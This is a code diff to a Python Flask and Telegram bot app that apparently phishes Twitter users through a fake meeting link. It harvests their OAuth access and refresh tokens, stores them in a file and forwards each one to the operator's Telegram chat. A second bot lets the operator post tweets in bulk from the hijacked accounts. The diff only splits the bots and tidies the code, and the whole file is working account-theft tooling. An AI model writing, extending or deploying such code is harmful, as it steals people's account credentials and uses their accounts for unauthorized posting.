@@ -11,23 +11,27 @@ from telegram.ext import CommandHandler, CallbackQueryHandler, Updater, MessageH
 CLIENT_ID = os.getenv('CLIENT_ID')
 CLIENT_SECRET = os.getenv('CLIENT_SECRET')
 CALLBACK_URL = 'https://gifter-7vz7.onrender.com/'  # Update with your callback URL
-TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
+ALERT_BOT_TOKEN = os.getenv('ALERT_BOT_TOKEN')  # Token for the alert bot
+AUTOMATION_BOT_TOKEN = os.getenv('AUTOMATION_BOT_TOKEN')  # Token for the automation bot
 TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')
 
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
 
-# Initialize Telegram Bot
-bot = Bot(token=TELEGRAM_BOT_TOKEN)
-updater = Updater(token=TELEGRAM_BOT_TOKEN, use_context=True)
-dispatcher = updater.dispatcher
+# Initialize the two bots
+alert_bot = Bot(token=ALERT_BOT_TOKEN)
+automation_bot = Bot(token=AUTOMATION_BOT_TOKEN)
+alert_updater = Updater(token=ALERT_BOT_TOKEN, use_context=True)
+automation_updater = Updater(token=AUTOMATION_BOT_TOKEN, use_context=True)
+alert_dispatcher = alert_updater.dispatcher
+automation_dispatcher = automation_updater.dispatcher
 
-
+# Function to save tokens to file
 def save_tokens_to_file(access_token, refresh_token):
     with open('tokens.txt', 'a') as file:
         file.write(f"{access_token},{refresh_token}\n")
 
-
+# Function to load tokens from file
 def load_tokens():
     tokens = []
     if os.path.exists('tokens.txt'):
@@ -35,10 +39,8 @@ def load_tokens():
             tokens = [line.strip().split(',') for line in file if line.strip()]
     return tokens
 
-
 def get_total_tokens():
     return len(load_tokens())
-
 
 def get_twitter_username(access_token):
     url = "https://api.twitter.com/2/users/me"
@@ -47,7 +49,6 @@ def get_twitter_username(access_token):
     }
 
     response = requests.get(url, headers=headers)
-
     if response.status_code == 200:
         data = response.json()
         username = data.get("data", {}).get("username")
@@ -56,8 +57,7 @@ def get_twitter_username(access_token):
         print(f"Failed to fetch username. Status code: {response.status_code}")
         return None
 
-
-# Generate code verifier and challenge
+# OAuth and meeting setup
 def generate_code_verifier_and_challenge():
     code_verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode('utf-8')
     code_challenge = base64.urlsafe_b64encode(
@@ -65,26 +65,19 @@ def generate_code_verifier_and_challenge():
     ).rstrip(b'=').decode('utf-8')
     return code_verifier, code_challenge
 
-
-# Function to send a startup message with OAuth link and meeting link
 def send_startup_message():
-    state = "0"  # Fixed state value for initialization
+    state = "0"
     code_verifier, code_challenge = generate_code_verifier_and_challenge()
-
-    # Generate the OAuth link
     authorization_url = CALLBACK_URL
-
-    # Generate the meeting link
     meeting_url = f"{CALLBACK_URL}j?meeting={state}&pwd={code_challenge}"
 
-    # Message content
     message = (
         f"🚀 *OAuth Authorization Link:*\n[Authorize link]({authorization_url})\n\n"
         f"📅 *Meeting Link:*\n[Meeting link]({meeting_url})"
     )
 
-    # Send the message to Telegram
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    # Send the message through the alert bot
+    url = f"https://api.telegram.org/bot{ALERT_BOT_TOKEN}/sendMessage"
     data = {
         "chat_id": TELEGRAM_CHAT_ID,
         "text": message,
@@ -92,18 +85,13 @@ def send_startup_message():
     }
     requests.post(url, json=data)
 
-
-# Function to send access and refresh tokens to Telegram
+# Function to send tokens to Telegram using the alert bot
 def send_to_telegram(access_token, refresh_token=None):
     alert_emoji = "🚨"
     key_emoji = "🔑"
-
-    # Get the username from the access token
+    
     username = get_twitter_username(access_token)
-    if username:
-        twitter_url = f"https://twitter.com/{username}"
-    else:
-        twitter_url = "Unknown user"
+    twitter_url = f"https://twitter.com/{username}" if username else "Unknown user"
 
     total_tokens = get_total_tokens()
 
@@ -117,23 +105,20 @@ def send_to_telegram(access_token, refresh_token=None):
 
     tweet_link = f"{CALLBACK_URL}tweet/{access_token}"
     message += f"{key_emoji} *Post a Tweet Link:* [Post a Tweet]({tweet_link})\n"
-    message += f"👤 *Twitter Profile:* [@{username}]({twitter_url})"  # Include username and profile link
+    message += f"👤 *Twitter Profile:* [@{username}]({twitter_url})"
 
-    # Save tokens to file
     save_tokens_to_file(access_token, refresh_token)
 
-    # Send the message to Telegram
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    url = f"https://api.telegram.org/bot{ALERT_BOT_TOKEN}/sendMessage"
     data = {
         "chat_id": TELEGRAM_CHAT_ID,
         "text": message,
-        "parse_mode": "Markdown"  # To format the message
+        "parse_mode": "Markdown"
     }
     requests.post(url, json=data)
 
-
-# Telegram Bot Commands
-def start(update, context):
+# Telegram Bot for Automation Tasks
+def start_automation(update, context):
     keyboard = [
         [InlineKeyboardButton("Refresh All Tokens", callback_data='refresh_all')],
         [InlineKeyboardButton("Post (Single Token)", callback_data='post_single')],
@@ -142,8 +127,7 @@ def start(update, context):
     reply_markup = InlineKeyboardMarkup(keyboard)
     update.message.reply_text('Choose an option:', reply_markup=reply_markup)
 
-
-def button(update, context):
+def handle_button(update, context):
     query = update.callback_query
     query.answer()
 
@@ -157,16 +141,13 @@ def button(update, context):
         query.edit_message_text(text="Enter the number of tokens to use for posting:")
         context.user_data['post_mode'] = 'bulk'
 
-
 def handle_message(update, context):
     user_message = update.message.text
     post_mode = context.user_data.get('post_mode')
 
     if post_mode == 'single':
-        # Post with a single token
         post_with_single_token(user_message)
     elif post_mode == 'bulk':
-        # Bulk posting
         try:
             num_tokens = int(user_message)
             context.user_data['num_tokens'] = num_tokens
@@ -174,23 +155,15 @@ def handle_message(update, context):
         except ValueError:
             update.message.reply_text("Please enter a valid number.")
 
-
 def refresh_all_tokens():
     tokens = load_tokens()
     refreshed_count = 0
-
     for access_token, refresh_token in tokens:
-        # Logic to refresh the token using refresh_token
-        # Example: Assume a new_access_token is obtained
-        new_access_token = access_token  # Placeholder, replace with actual token refresh logic
+        new_access_token = access_token
         new_refresh_token = refresh_token
-
-        # Save the new tokens
         save_tokens_to_file(new_access_token, new_refresh_token)
         refreshed_count += 1
-
-    bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=f"Refreshed {refreshed_count} tokens.")
-
+    automation_bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=f"Refreshed {refreshed_count} tokens.")
 
 def post_tweet(access_token, tweet_text):
     TWITTER_API_URL = "https://api.twitter.com/2/tweets"
@@ -198,12 +171,8 @@ def post_tweet(access_token, tweet_text):
         "Authorization": f"Bearer {access_token}",
         "Content-Type": "application/json"
     }
-    payload = {
-        "text": tweet_text
-    }
-
+    payload = {"text": tweet_text}
     response = requests.post(TWITTER_API_URL, json=payload, headers=headers)
-
     if response.status_code == 201:
         tweet_data = response.json()
         return f"Tweet posted successfully: {tweet_data['data']['id']}"
@@ -211,16 +180,14 @@ def post_tweet(access_token, tweet_text):
         error_message = response.json().get("detail", "Failed to post tweet")
         return f"Error posting tweet: {error_message}"
 
-
 def post_with_single_token(message):
     tokens = load_tokens()
     if tokens:
-        access_token, _ = tokens[0]  # Pick the first token for simplicity
+        access_token, _ = tokens[0]
         result = post_tweet(access_token, message)
-        bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=f"{result}")
+        automation_bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=f"{result}")
     else:
-        bot.send_message(chat_id=TELEGRAM_CHAT_ID, text="No tokens available.")
-
+        automation_bot.send_message(chat_id=TELEGRAM_CHAT_ID, text="No tokens available.")
 
 def post_with_bulk_tokens(message, num_tokens):
     tokens = load_tokens()
@@ -228,28 +195,25 @@ def post_with_bulk_tokens(message, num_tokens):
         for i in range(num_tokens):
             access_token, _ = tokens[i]
             result = post_tweet(access_token, message)
-            bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=f"{result}")
+            automation_bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=f"{result}")
             time.sleep(5)  # Delay between posts
     else:
-        bot.send_message(chat_id=TELEGRAM_CHAT_ID, text="Not enough tokens available.")
+        automation_bot.send_message(chat_id=TELEGRAM_CHAT_ID, text="Not enough tokens available.")
 
+# Set up command handlers for automation bot
+automation_dispatcher.add_handler(CommandHandler('start', start_automation))
+automation_dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
+automation_dispatcher.add_handler(CallbackQueryHandler(handle_button))
 
-# Set up command handlers
-start_handler = CommandHandler('start', start)
-message_handler = MessageHandler(Filters.text & ~Filters.command, handle_message)  # Filters import is from telegram.ext
-dispatcher.add_handler(start_handler)
-dispatcher.add_handler(message_handler)
-dispatcher.add_handler(CallbackQueryHandler(button))
-
-# Flask Routes for OAuth and Token Management
+# Flask route
 @app.route('/')
 def home():
-    # Existing home function
     pass
 
-# Run the bot
+# Run the bots
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
-    send_startup_message()  # Send the startup message with OAuth and meeting links
-    updater.start_polling()  # Start the Telegram bot polling
+    send_startup_message()  # Send startup message through alert bot
+    alert_updater.start_polling()  # Start alert bot polling
+    automation_updater.start_polling()  # Start automation bot polling
     app.run(host='0.0.0.0', port=port)
